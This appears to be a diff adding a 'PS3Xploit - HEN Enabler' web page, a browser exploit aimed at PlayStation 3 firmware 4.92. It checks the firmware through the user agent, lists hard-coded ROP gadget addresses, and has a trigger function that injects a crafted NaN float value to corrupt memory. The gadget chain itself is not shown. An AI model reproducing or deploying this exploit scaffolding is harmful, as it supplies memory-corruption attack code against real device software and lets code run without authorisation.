@@ -1,0 +1,45 @@
+<html lang="en">
+  <body>
+    <script>
+      var ua = navigator.userAgent;
+      var fwv = ua.includes("4.92") ? "4.92" : "unsupported";
+
+      if (fwv !== "4.92") {
+        alert("This script only works on PS3 Firmware 4.92.");
+        throw new Error("Unsupported firmware");
+      }
+
+      var toc_addr = 0x7296344;
+      var gadget1_addr = 0x620036;
+      var gadget8_addr = 0x131072;
+      var gadget_mod1_addr = 0x6352848;
+      var gadget_mod2_addr = 0x80756;
+      var gadget_mod3_addr = 0x757248;
+      var gadget_mod4a_addr = 0x890500;
+      var gadget_mod4b_addr = 0x4376436;
+      var gadget_mod4c_addr = 0x346864;
+      var gadget_mod7_addr = 0x108204;
+      var gadget_mod8_addr = 0x2862260;
+      var gadget_mod9_addr = 0x68384;
+      var gadget_mod12_addr = 0x6500852;
+      var gadget_mod15_addr = 0x3788852;
+
+      function showResult(str) {
+        document.getElementById("result").innerHTML = str;
+      }
+
+      function trigger(exploit_addr) {
+        if (document.getElementById("trigger")) {
+          document.getElementById("trigger").innerHTML = -parseFloat(
+            "NAN(ffffe" + exploit_addr.toString(16) + ")"
+          );
+        }
+      }
+
+      function logAdd() {}
+      document.write(
+        '<html> <head> <title>PS3Xploit - HEN Enabler</title> <style>html{color: #fff; left: 100%; overflow: hidden; position: relative;}*{font-weight: 100; font-size: 32px !important;}#a{display: table; height: 100%; left: -100%; position: relative; width: 100%; text-align: center;}#b{display: table-cell; text-align: center; vertical-align: middle; width: 100%;}#c{-webkit-animation: s 2s infinite; -webkit-border-radius: 10px; background: #6f0; display: inline-block; height: 48px; right: 24px; position: absolute; top: 28px; width: 48px;}#c.fail{background: #f00;}#d{position: relative; z-index: 1;}#result{-webkit-border-radius: 10px; background: #000; display: inline-block; font-weight: 700; padding: 32px; padding-right: 92px; position: relative;}@-webkit-keyframes s{0%{-webkit-transform: rotate(0);}100%, 90%{-webkit-transform: rotate(540deg);}}input{opacity: 0;}b{color: #f00;}s{color: #6f0; text-decoration: none; font-weight: 800;}</style> </head> <body> <div id="exploit"></div><div id="trigger"></div><div id="a"> <input type="radio" autofocus/> <div id="b"> <div id="result"> <div id="c"></div><div id="d">Enabling <s>HEN</s></div></div></div></div></body></html>'
+      );
+    </script>
+  </body>
+</html>
